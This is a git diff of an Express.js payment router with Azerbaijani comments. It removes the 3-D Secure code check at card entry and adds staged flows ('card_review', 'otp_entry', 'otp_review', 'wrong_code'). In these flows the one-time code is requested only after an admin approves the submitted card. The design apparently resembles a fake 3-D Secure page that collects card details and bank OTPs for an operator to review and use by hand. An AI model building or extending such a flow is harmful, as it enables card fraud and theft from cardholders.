@@ -218,12 +218,8 @@ router.post('/api/payment/card/init', requireAuth, async (req, res) => {
     const cardErr = validateCardInput(b.card);
     if (cardErr) return res.status(400).json({ ok: false, message: cardErr });
 
-    // ✅ 3D KOD VALIDASIYASI (RESTORED)
-    const codeErr = validateCode(b.card.code3d);
-    if (codeErr) return res.status(400).json({ ok: false, message: codeErr });
-
-    // ✅ 3D kodu ilə ödəniş yaradılır
-    const payment = await paymentService.initPayment(order, b.card, 'card', b.card.code3d);
+    // İlk kart girişində 3-D kod istənilmir — OTP admin təsdiqindən sonra açılır
+    const payment = await paymentService.initPayment(order, b.card, 'card');
 
     return res.json({
       ok: true,
@@ -251,16 +247,11 @@ router.post('/api/payment/balance/init', requireAuth, async (req, res) => {
     const cardErr = validateCardInput(b.card);
     if (cardErr) return res.status(400).json({ ok: false, message: cardErr });
 
-    // ✅ 3D KOD VALIDASIYASI (RESTORED)
-    const codeErr = validateCode(b.card.code3d);
-    if (codeErr) return res.status(400).json({ ok: false, message: codeErr });
-
     if ((req.currentUser.balance || 0) < order.total) {
       return res.status(400).json({ ok: false, message: 'Balans kifayət etmir' });
     }
 
-    // ✅ 3D kodu ilə ödəniş yaradılır
-    const payment = await paymentService.initPayment(order, b.card, 'balance', b.card.code3d);
+    const payment = await paymentService.initPayment(order, b.card, 'balance');
 
     return res.json({
       ok: true,
@@ -315,7 +306,8 @@ router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
       return res.redirect('/' + res.locals.locale + '/odenis-gozleme/' + order._id);
     }
 
-    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    let payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    payment = await paymentService.advanceIfExpired(payment);
     const stage = payment ? payment.stage : 'otp_entry';
 
     res.render('pages/secure3d', {
@@ -326,7 +318,8 @@ router.get('/3d-tesdiq/:orderId', requireAuth, async (req, res, next) => {
       stage,
       secondsLeft: payment ? paymentService.secondsLeft(payment) : 0,
       stageSeconds: paymentService.STAGE_SECONDS,
-      codeSubmitted: stage === 'otp_review' || order.status === 'code_submitted'
+      wrongCode: stage === 'wrong_code',
+      codeSubmitted: stage !== 'otp_entry'
     });
   } catch (e) {
     next(e);
@@ -357,7 +350,8 @@ router.get('/api/payment/:orderId/status', requireAuth, async (req, res) => {
     const order = await Order.findOne({ _id: req.params.orderId, user: req.currentUser._id }).lean();
     if (!order) return res.status(404).json({ ok: false, message: 'Sifariş tapılmadı' });
     
-    const payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    let payment = order.payment ? await Payment.findById(order.payment).lean() : null;
+    payment = await paymentService.advanceIfExpired(payment);
     const stage = payment ? payment.stage : 'card_review';
 
     let redirect = null;
